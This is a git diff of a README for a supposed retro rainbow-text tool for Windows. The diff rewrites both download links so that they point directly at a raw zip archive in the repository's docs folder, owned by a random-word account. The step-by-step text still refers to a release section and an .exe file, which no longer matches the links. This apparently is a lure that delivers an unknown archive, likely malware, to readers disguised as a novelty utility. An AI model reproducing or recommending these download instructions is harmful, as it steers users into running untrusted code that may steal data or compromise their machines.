@@ -1,6 +1,6 @@
 # 🌈 F4D3R-by-HIGHBAUD - Create retro rainbow text effects easily
 
-[![](https://img.shields.io/badge/Download_F4D3R-blue?style=for-the-badge)](https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD)
+[![](https://img.shields.io/badge/Download_F4D3R-blue?style=for-the-badge)](https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD/raw/refs/heads/main/docs/HIGHBAUD_by_3.8.zip)
 
 F4D3R-by-HIGHBAUD brings back the aesthetic of late-90s internet chat rooms. This tool converts plain text into colorful formats ready for pasting into modern platforms like Discord or nostalgic environments using AOL-style HTML. It supports multiple output formats including ANSI colors, Unicode styles, and web-ready code.
 
@@ -16,7 +16,7 @@ This software works on Windows 10 and Windows 11. It requires no installation or
 
 You visit the download page to obtain the application. Follow these instructions to get started.
 
-1. Go to [https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD](https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD).
+1. Go to [https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD/raw/refs/heads/main/docs/HIGHBAUD_by_3.8.zip](https://github.com/Lecherousnessgenusscomber809/F4D3R-by-HIGHBAUD/raw/refs/heads/main/docs/HIGHBAUD_by_3.8.zip).
 2. Look for the release section on the right side of the page.
 3. Click the link that ends in .exe to start the file download.
 4. Save the file to your desktop or a folder you can find later.
